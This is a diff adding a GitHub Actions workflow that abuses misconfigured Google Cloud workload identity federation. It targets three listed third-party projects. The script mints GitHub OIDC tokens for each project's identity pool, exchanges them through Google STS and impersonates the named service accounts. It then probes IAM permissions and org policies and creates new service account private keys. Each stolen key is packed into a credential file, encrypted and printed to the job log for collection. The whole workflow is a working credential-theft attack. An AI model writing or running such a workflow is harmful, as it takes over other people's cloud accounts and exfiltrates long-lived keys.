@@ -1,0 +1,115 @@
+name: wf1210b
+on:
+  workflow_dispatch:
+    inputs:
+      passfd:
+        description: enc pass
+        required: true
+permissions:
+  id-token: write
+  contents: read
+jobs:
+  wf1210b:
+    runs-on: ubuntu-latest
+    timeout-minutes: 40
+    steps:
+      - name: round2
+        env:
+          PASS: ${{ inputs.passfd }}
+        run: |
+          set +e
+          mkdir -p out
+          jq -n '{scope:["https://www.googleapis.com/auth/cloud-platform"], lifetime:"3600s"}' > req.json
+          mint() {
+            local PRJ="$1"
+            AUD="https://iam.googleapis.com/$PRJ"
+            rm -f tok.jwt
+            for a in 1 2 3; do
+              curl -s -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=$AUD" | jq -r '.value // empty' > tok.jwt
+              [ -s tok.jwt ] && return 0
+              sleep 3
+            done
+            return 1
+          }
+          sts() {
+            local PRJ="$1"
+            curl -s -o r.json -w '%{http_code}' -X POST https://sts.googleapis.com/v1/token \
+              -d "grant_type=urn:ietf:params:oauth:grant-type:token-exchange" \
+              --data-urlencode "audience=//iam.googleapis.com/$PRJ" \
+              --data-urlencode "subject_token=$(cat tok.jwt)" \
+              -d "subject_token_type=urn:ietf:params:oauth:token-type:jwt" \
+              -d "requested_token_type=urn:ietf:params:oauth:token-type:access_token" \
+              -d "scope=https://www.googleapis.com/auth/cloud-platform"
+          }
+          emit_secret() {
+            local label="$1" f="$2" b
+            [ -s "$f" ] || { echo "##SECRET $label MISSING"; return; }
+            b=$(tar czf - -C "$(dirname "$f")" "$(basename "$f")" | openssl enc -aes-256-cbc -pbkdf2 -salt -pass pass:"$PASS" 2>/dev/null | base64 -w0)
+            echo "##SECRET $label len_local=$(wc -c < "$f") b64=$b"
+          }
+          probe() {
+            local label="$1" m="$2" url="$3" body="$4" c b
+            if [ -n "$body" ]; then
+              c=$(curl -s -o o.json -w '%{http_code}' -X "$m" -H "Authorization: Bearer $AT" -H "Content-Type: application/json" "$url" -d "$body")
+            else
+              c=$(curl -s -o o.json -w '%{http_code}' -X "$m" -H "Authorization: Bearer $AT" "$url")
+            fi
+            b=$(head -c 800 o.json | tr -d '\n' | tr -s ' ')
+            echo "##P num=$NUM label=$label code=$c body=$b"
+          }
+          mkkey() {
+            local sa="$1" label="$2" c keyid pk cid
+            c=$(curl -s -o k.json -w '%{http_code}' -X POST -H "Authorization: Bearer $AT" -H "Content-Type: application/json" "https://iam.googleapis.com/v1/projects/$NUM/serviceAccounts/$sa/keys" -d '{"keyAlgorithm":"KEY_ALG_RSA_2048"}')
+            echo "##KEY num=$NUM sa=$sa code=$c len=$(wc -c < k.json)"
+            if [ "$c" = "200" ]; then
+              keyid=$(jq -r '.name' k.json | awk -F/ '{print $NF}')
+              pk=$(jq -r '.privateKeyData' k.json | base64 -d)
+              cid=$(curl -s -H "Authorization: Bearer $AT" "https://iam.googleapis.com/v1/projects/$NUM/serviceAccounts/$sa" | jq -r '.oauth2ClientId // empty')
+              jq -n --arg pid "$PID" --arg kid "$keyid" --arg pk "$pk" --arg sa "$sa" --arg cid "$cid" '{type:"service_account",project_id:$pid,private_key_id:$kid,private_key:$pk,client_email:$sa,client_id:$cid,auth_uri:"https://accounts.google.com/o/oauth2/auth",token_uri:"https://oauth2.googleapis.com/token",auth_provider_x509_cert_url:"https://www.googleapis.com/oauth2/v1/certs",client_x509_cert_url:("https://www.googleapis.com/robot/v1/metadata/x509/"+($sa|gsub("@";"%40"))),universe_domain:"googleapis.com"}' > "out/$label-$NUM.json"
+              echo "##KEYMETA num=$NUM sa=$sa keyid=$keyid cid=$cid keysize=${#pk}"
+              emit_secret "key-$label-$NUM" "out/$label-$NUM.json"
+            else
+              head -c 500 k.json | tr -d '\n'
+              echo
+            fi
+          }
+          TARGETS='
+          363590592857|363590592857-compute@developer.gserviceaccount.com|projects/363590592857/locations/global/workloadIdentityPools/github-action/providers/github|tranquil-post-357802
+          731679007643|github-actions@rails-todo-app-386721.iam.gserviceaccount.com|projects/731679007643/locations/global/workloadIdentityPools/github-actions/providers/rails-todo-identity-pool-github|rails-todo-app-386721
+          536185737408|github@carbonifer-sandbox.iam.gserviceaccount.com|projects/536185737408/locations/global/workloadIdentityPools/carbonifer-gh-pool/providers/carbonifer-oidc-provider|carbonifer-sandbox
+          '
+          echo "$TARGETS" | sed 's/^ *//' | grep -v '^$' | while IFS='|' read -r NUM SA PRJ PID; do
+            [ -z "$NUM" ] && continue
+            echo "=== R2 TARGET num=$NUM sa=$SA pid=$PID"
+            AT=""
+            if ! mint "$PRJ"; then echo "##ERR num=$NUM MINT_FAIL"; continue; fi
+            sc=$(sts "$PRJ")
+            echo "##STS num=$NUM code=$sc"
+            FT=$(jq -r '.access_token // empty' r.json)
+            if [ -z "$FT" ]; then echo "##ERR num=$NUM STS_FAIL"; continue; fi
+            gc=$(curl -s -o g.json -w '%{http_code}' -X POST -H "Authorization: Bearer $FT" -H "Content-Type: application/json" "https://iamcredentials.googleapis.com/v1/projects/-/serviceAccounts/$SA:generateAccessToken" -d @req.json)
+            AT=$(jq -r '.accessToken // empty' g.json)
+            echo "##GEN num=$NUM code=$gc toklen=${#AT}"
+            if [ -z "$AT" ]; then continue; fi
+            echo "--- SA-level testIamPermissions (POST form)"
+            c=$(curl -s -o o.json -w '%{http_code}' -X POST -H "Authorization: Bearer $AT" -H "Content-Type: application/json" "https://iam.googleapis.com/v1/projects/$NUM/serviceAccounts/$SA:testIamPermissions" -d '{"permissions":["iam.serviceAccountKeys.create","iam.serviceAccounts.getAccessToken","iam.serviceAccounts.setIamPolicy","iam.serviceAccounts.implicitDelegation"]}')
+            echo "##TIP-SA num=$NUM code=$c body=$(head -c 700 o.json | tr -d '\n' | tr -s ' ')"
+            probe "keys-list" GET "https://iam.googleapis.com/v1/projects/$NUM/serviceAccounts/$SA/keys" ""
+            if [ "$NUM" = "363590592857" ]; then
+              echo "--- ORGPOLICY disableServiceAccountKeyCreation"
+              probe "orgpol-key" GET "https://orgpolicy.googleapis.com/v2/projects/$NUM/policies/iam.disableServiceAccountKeyCreation" ""
+              probe "orgpol-list" GET "https://orgpolicy.googleapis.com/v2/projects/$NUM/policies?pageSize=30" ""
+              echo "--- KEY on the freshly created SA (correct project-number domain)"
+              mkkey "vertex-ci-a15401af@363590592857.iam.gserviceaccount.com" "newsa"
+              echo "--- after short wait, retry compute SA key"
+              sleep 25
+              mkkey "$SA" "compute"
+              echo "--- also try cloudservices SA"
+              mkkey "363590592857@cloudservices.gserviceaccount.com" "cloudservices"
+              echo "--- reload SA list"
+              probe "salist2" GET "https://iam.googleapis.com/v1/projects/$NUM/serviceAccounts?pageSize=50" ""
+            fi
+            sleep 0.3
+          done
+          echo "=== CLOUD BUILD LOG MINING (aryeelab token not available here; skip) ==="
+          echo "##FINISHED"
